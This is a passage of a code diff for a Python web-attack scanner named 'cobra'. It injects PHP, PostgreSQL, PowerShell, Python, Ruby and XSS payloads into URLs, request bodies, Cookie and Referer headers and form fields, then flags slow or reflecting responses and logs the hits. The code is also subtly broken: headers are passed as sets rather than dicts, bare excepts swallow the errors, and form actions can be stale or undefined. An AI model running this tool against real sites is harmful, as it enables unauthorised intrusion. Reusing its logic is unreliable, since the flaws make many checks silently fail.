+                    hits.append(f"php injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"php injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"php injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for postgresql injection
+        for mal in mal_postgresql:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"postgresql injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"postgresql injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"postgresql injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"postgresql injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"postgresql injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"postgresql injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for powershell injection
+        for mal in mal_powershell:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"powershell injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"powershell injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"powershell injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"powershell injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"powershell injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"powershell injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for python injection
+        for mal in mal_python:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"python injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"python injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"python injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"python injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"python injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"python injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for ruby injection
+        for mal in mal_ruby:
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_ + "/" + mal, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ruby injection in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, data = mal.encode(), timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ruby injection in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Cookie",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ruby injection in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                start = time.time()
+                data = text(_, headers = {"Referer",mal}, timeout = 120)
+                end = time.time()
+                if end - start >= 45:
+                    hits.append(f"ruby injection in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"ruby injection in forms: {action} | {field_dict}")
+
+                            else:
+                                start = time.time()
+                                data = text(action,method=method_field,data=field_dict,timeout=120)
+                                end = time.time()
+                                if end - start >= 45:
+                                    hits.append(f"ruby injection in forms: {_} | {field_dict}")
+
+                except:
+                    pass
+
+        # check for xss
+        for mal in mal_xss:
+            try:
+                time.sleep(delay)
+                data = text(_ + "/" + mal)
+                if mal in data:
+                    hits.append(f"xss in url: {_}/{mal}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                data = text(_, data = mal.encode())
+                if mal in data:
+                    hits.append(f"xss in data ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                data = text(_, headers = {"Cookie",mal})
+                if mal in data:
+                    hits.append(f"xss in cookie ({mal}): {_}")
+
+            except:
+                pass
+
+            try:
+                time.sleep(delay)
+                data = text(_, headers = {"Referer",mal})
+                if mal in data:
+                    hits.append(f"xss in referer ({mal}): {_}")
+
+            except:
+                pass
+            
+            for form in forms:
+                field_list = []
+                input_field = re.findall("<input.+?>",form)
+                try:
+                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                    if action_field.startswith("/"):
+                        action = host + action_field
+
+                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                        action = host + "/" + action_field
+
+                    else:
+                        action = action_field
+                        
+                except IndexError:
+                    pass
+
+                try:
+                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                    for in_field in input_field:
+                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            try:
+                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            
+                            except IndexError:
+                                value_field = ""
+                            
+                            if type_field == "submit" or type_field == "hidden":
+                                field_list.append({name_field:value_field})
+
+
+                            if type_field != "submit" and type_field != "hidden":
+                                field_list.append({name_field:mal})
+
+                            field_dict = field_list[0]
+                            for init_field_dict in field_list[1:]:
+                                field_dict.update(init_field_dict)
+
+                            time.sleep(delay)
+
+                            if action:
+                                data = text(action,method=method_field,data=field_dict)
+                                if mal in data:
+                                    hits.append(f"xss in forms: {action} | {field_dict}")
+
+                            else:
+                                data = text(action,method=method_field,data=field_dict)
+                                if mal in data:
+                                    hits.append(f"xss in forms: {_} | {field_dict}")
 
                 except:
                     pass
@@ -222,8 +1599,12 @@ def cobra(host,delay=0):
     hits.sort()
 
     if len(hits) > 0:
-        for hit in hits:
-            print(RED + hit)
+        with open("cobra.log", "a") as file:
+            for hit in hits:
+                file.write(f"{hit}\n")
+                print(RED + hit)
 
     else:
-        print(GREEN + f"we didn't find anything interesting on {host}")
+        with open("cobra.log", "a") as file:
+            file.write(f"we didn't find anything interesting on {host}\n")
+            print(GREEN + f"we didn't find anything interesting on {host}")
